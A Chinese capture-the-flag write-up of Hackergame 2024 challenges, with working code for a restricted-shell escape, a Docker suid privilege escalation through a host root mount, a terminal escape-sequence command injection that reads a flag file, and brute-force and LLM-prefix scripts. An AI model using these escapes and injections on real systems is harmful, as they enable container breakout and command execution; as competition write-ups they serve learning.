# YUKI.N Writeups

一年一度的 Hackergame，玩得非常开心！这里记录一些和官方题解不同的做法。

- Author: [@liuly0322](https://github.com/liuly0322)
- License: [CC0 1.0](https://creativecommons.org/publicdomain/zero/1.0/deed.zh-hans)

## PowerfulShell

```shell
PowerfulShell@hackergame> ~
/players/PowerfulShell.sh: line 16: /players: Is a directory
```

所以我们可以构造执行 `ls ~` ，再拿到它的结果：

```shell
PowerfulShell@hackergame> _1=~
PowerfulShell@hackergame> _2=${_1:2:1}
PowerfulShell@hackergame> _3=${_1:7:1}
PowerfulShell@hackergame> _4=`$_2$_3 ~`
PowerfulShell@hackergame> $_4
/players/PowerfulShell.sh: line 16: PowerfulShell.sh: command not found
```

通过 `sh` 即可获得 shell，并在里面读取 flag：

```shell
PowerfulShell@hackergame> _5=${_4:14:2}
PowerfulShell@hackergame> $_5
cat /flag
flag{N0w_I_Adm1t_ur_tru1y_5He11_m4ster_bae08a2ded}
```

## 强大的正则表达式

介绍一种 flag2 和 flag3 构造 DFA 转正则的方法。（因为我搜到的几个库都不太好用所以自己手搓了）

以 flag3 为例：

```python
N = 8
def R_factory():
    R = [[None] * N for _ in range(N)]
    for i in range(N):
        for j in range(N):
            R[i][j] = ''
    return R

R = defaultdict(R_factory)

for i in range(N):
    for j in range(N):
        # how do i goes to j?
        way = '...'
        R[-1][i][j] = way


for k in range(N):
    for i in range(N):
        for j in range(N):
            new_way_relaxed = '(' + R[k-1][i][k] + ')(' + R[k-1][k][k] + ')*(' + R[k-1][k][j] + ')'
            R[k][i][j] = '(' + R[k-1][i][j] + ')' + '|(' + new_way_relaxed + ')'

result = R[7][7][0]
```

设 `R[k][i][j]` 为一个能判定所有从 i 状态到 j 状态，并且中间经过结点（不包括 i 和 j）的下标最大为 k 的正则表达式。

- 初始化 `R[-1][i][j]` 为 i 直接到 j 的路径转移（因为不能经过其他结点）；
- 之后每次迭代对新加入的结点松弛。

则 `R[N-1][i][j]` 就能判定所有从 i 到 j 的路径，因为图上所有结点下标最大为 N-1。

## 无法获得的秘密

提供一种简单的做法，首先把 VNC 里的终端尽可能放大，然后根据终端的宽高调整下面脚本的参数，宽设置为实际终端宽度减去 2。

这样就会把数据用 `@` 和空格表示出来，好处是不用 OCR，只用判断某个区域是黑色还是白色就能拿到对应 bit。录屏再用脚本提取数据即可。

```python
import time
import os

# 4194304 / 165 / 48 = 530 frames

f = open('/secret', 'rb').read()
f = ''.join(format(byte, '08b') for byte in f)
f = ''.join('@' if c == '1' else ' ' for c in f)

for i in range(530):
    r = os.system('clear')
    print(i)
    print(f[i*7920:(i+1)*7920])
    time.sleep(1)
```

此时展示的就是二值化后的数据，录屏后的处理是 trivial 的。

### 提取所有帧

```python
import cv2

# 读入视频
cap = cv2.VideoCapture('secret.mp4')

# 总帧数
total_frames = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))

saved = 0
for i in range(total_frames):
    # 读取视频的帧
    ret, frame = cap.read()
    if not ret:
        break
    # 计算相似度
    if i > 0:
        diff = cv2.absdiff(frame, last_frame)
        diff = cv2.cvtColor(diff, cv2.COLOR_BGR2GRAY)
        diff = cv2.threshold(diff, 30, 255, cv2.THRESH_BINARY)[1]
        diff = cv2.countNonZero(diff)
        if diff > 500000:
            cv2.imwrite(f'output/{saved}.jpg', frame)
            saved += 1
    last_frame = frame
```

### 二值化获取数据

```python
import numpy as np
from PIL import Image

threshold = 100

def process_image(image_path):
    image = Image.open(image_path)
    img_array = np.array(image)

    cell_width, cell_height = 15, 28.5
    cols, rows = 165, 48

    r = np.zeros((rows, cols), dtype=int)

    for i in range(rows):
        for j in range(cols):
            top = int(i * cell_height) + 28
            left = j * cell_width + 2
            right = left + cell_width
            bottom = int(top + cell_height)
            cell = img_array[top:bottom, left:right]
            cell = (cell > 20).astype(int)
            non_black_pixels = np.sum(np.any(cell != [0, 0, 0], axis=-1))
            r[i, j] = non_black_pixels

    r = (r >= threshold).astype(int)
    return r

def result_to_bytes(result):
    result = result.flatten()
    raw_bytes = []
    assert len(result) % 8 == 0
    for i in range(0, len(result), 8):
        byte = 0
        for j in range(8):
            byte |= result[i + j] << (7 - j)
        raw_bytes.append(byte)
    return bytes(raw_bytes)

if __name__ == '__main__':
    raw_bytes = b""
    for i in range(530):
        print(i)
        image_path = f"output/{i}.jpg"
        result = process_image(image_path)
        raw_bytes += result_to_bytes(result)
    raw_bytes = raw_bytes[:524288]
    with open("secret", "wb") as f:
        f.write(raw_bytes)
```

## Docker for Everyone Plus

### Unbreakable!

同第一问，构造一个带有 `suid` 的程序的镜像，然后 `--security-opt="no-new-privileges:false"` 就可以愉快的提权了。因为设备还是没有挂载，所以不能直接访问 `/dev/vdb`，但我们可以挂载 `/:/outside`，然后容器内 `su-exec root chmod 777 /outside/dev/vdb`，再退出容器就可以在宿主机上读取到 flag 了。

## 动画分享

- 没想到 `\r` 也可以换行，但是多发几次就可以了，只要保证 payload 紧跟着 CTRL+C（`\x03`）就行；
- payload 如果直接 `cp` 需要 `chmod`，所以这里 `cat` 重定向一条也够了；

```python
#!/usr/bin/env python3

import socket
import time

def send(content):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2.0)
    sock.connect(("127.0.0.1", 8000))
    sock.sendall(content)
    sock.recv(8192)
    sock.close()

send(b"GET / HTTP/1.1 \x1bP$q\n")
send(b"\x03cat /flag2 > /dev/shm/1\n")
send(b"\x1B\x5c\n")

time.sleep(1)

with open("/dev/shm/1", "r") as f:
    print(f.read())
```

## 神秘代码 2

fuzzing。

### flag2

观察到每 3 个字节输入变成了 4 个字节输出，所以猜测是 base64 编码魔改。每次爆破三个字节然后更新当前爆破出的前缀就可以了。

```python
import subprocess
import multiprocessing
import time

PROCESS_NUM = 16
TIME_SLEEP = 60

def subtask(current, current_state_target, idx):
    show_progress = (idx == 0)
    for n in range(idx, 256 ** 3, PROCESS_NUM):
        if show_progress and n % 80000 == 0:
            print(n / 256 ** 3)
        s = n.to_bytes(3, "big")
        current_test = current + s
        process = subprocess.Popen(["./uxnmin", "level2.rom"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        process.stdin.write(current_test)
        process.stdin.close()
        result = process.stdout.read()
        process.wait()
        if result[-4:] == current_state_target:
            return current_test
    return None

def verify_current(current, target):
    assert len(current) % 3 == 0
    process = subprocess.Popen(["./uxnmin", "level2.rom"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    process.stdin.write(current)
    process.stdin.close()
    result = process.stdout.read()
    process.wait()
    print(f"{result =}, {target =}")
    return target[:len(current) // 3 * 4] == result

def find_matching_state(target):
    current = b'x\x9cK\xcbIL\xaf\xb6\xc800\x8b\x07\xa2"\x13c\x83\xf8d\xc3\x14\x93x\x93d\x0bc\xa3$\x033s\xc3d\xc3Z.\x00\xda8\n'
    assert verify_current(current, target)
    for i in range(len(current) // 3, 14):
        current_state_target = target[i * 4: (i + 1) * 4]
        pool = multiprocessing.Pool(PROCESS_NUM)
        result = None
        def callback(ret_val):
            nonlocal result
            if ret_val is not None:
                result = ret_val
                pool.terminate()
        for idx in range(PROCESS_NUM):
            pool.apply_async(subtask, args=(current, current_state_target, idx), callback=callback)
        pool.close()
        pool.join()

        assert result is not None:
        current = result
        print(current)
        with open('level2_checkpoint.txt', 'w') as f:
            f.write(current.hex() + '\n')

        time.sleep(TIME_SLEEP)

if __name__ == '__main__':
    target = b"nxxXCfcNMEPe2XW5MidmmsRSOG5ia0I7He/KMuNsDoKECkGgyE6bJXu/"
    find_matching_state(target)
```

因为时间比较长，大概需要好几个小时，所以 `current` 采用了方便的敏捷开发的硬编码（）爆破出来后 zlib 解压之。

### flag3

fuzzing 发现 3 个字节对应 8 个 hex，然后命令行参数的 key 是循环的，每次都是 key 对应字符模 16 后加到没有 key（或者说 key=0）时的结果上，所以根据 `zlib.compress` 压缩后内容前六个字节凑一凑拿到 `key`，然后 target 都减掉 key 对应位，就变成了 key=0 的情况，此时每三个字节对应的 8 个 hex 就固定了，同第二问爆破之即可（而且只需要爆破一次）。

```python
import subprocess
import time
import zlib

target_str = b"ecfhfddhgagmejfcfmehgggiepeddhffeldbddgagigmgegdeldddfebfoejdlfjgddddldfgkelfeeddgejdpdjecddfegdgifofagdfidpeiefdfdidafldidgdmda"

targets = []
for i in range(0, len(target_str), 8):
    targets.append(target_str[i:i+8])

print(target_str, targets)

# map index to raw
# index from 0 to 15
m = dict()

for n in range(256 ** 3):
    if n % 80000 == 0:
        print(n / 256 ** 3)
    s = n.to_bytes(3, "big")
    current_test = s
    process = subprocess.Popen(["./uxnmin", "level3.rom", "0"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    process.stdin.write(current_test)
    process.stdin.close()
    result = process.stdout.read()
    process.wait()
    assert len(result) == 8
    for i in range(16):
        if targets[i] == result:
            m[i] = current_test
            print(i, current_test, result)

raw = b""
for i in range(16):
    raw += m[i]
print(zlib.decompress(raw))
```

## 「<|这里原本是超长的题目名字|>」

我没有修改 llama.cpp。可能运气比较好，直接跑+手操就过了。次优解会导致推理卡住，这个时候可以 temp 调大一点，然后多跑几次，手动推理。

```python
import subprocess

def censor(s):
    for c in "hackergame of ustc":
        s = s.replace(c, "x")
    return s

target = """目标的和谐后的字符串"""
current_result = """每次推到一半退出后可以手动改这个"""

sh_command = lambda current_for_shell: f"""
./llama-cli -m ../../qwen2.5-3b-instruct-q8_0.gguf \
    -co -sp -p "<|im_start|>system\nYou are a professional CTF player.<|im_end|>\n<|im_start|>user\nWrite a short article for Hackergame 2024 (中国科学技术大学 (University of Science and Technology of China) 第十一届信息安全大赛) in English. The more funny and unreal the better. About 500 words.<|im_end|>\n<|im_start|>assistant\n{current_for_shell}" \
    -fa -ngl 80 -n 16 --temp 0.2
"""
    
MATCH_PREFIX = 35

def update_current_result(current_result, target):
    # check censor
    assert censor(current_result) in target

    current_for_shell = current_result.replace("\n", "\\n")
    sp = subprocess.run(sh_command(current_for_shell), shell=True, capture_output=True)
    o = sp.stdout.decode()
    o = o.split(current_result)

    if len(o) == 2:
        o = o[1]
    else:
        assert len(o) > 2
        o = ''.join(o[1:])

    target_rest = target[len(current_result):]

    print(target_rest[:MATCH_PREFIX])
    print(censor(o)[:MATCH_PREFIX])
    print(o[:MATCH_PREFIX])
    if target_rest[:MATCH_PREFIX] == censor(o)[:MATCH_PREFIX]:
        if " " in o[:MATCH_PREFIX]:
            for i in range(MATCH_PREFIX, 0, -1):
                if o[i] == " ":
                    return current_result + o[:i]
        return current_result
    else:
        return current_result


while current_result != target:
    current_result = update_current_result(current_result, target)
    print(current_result)
```

每次只采纳空格前面的，这样可以避免破坏 token。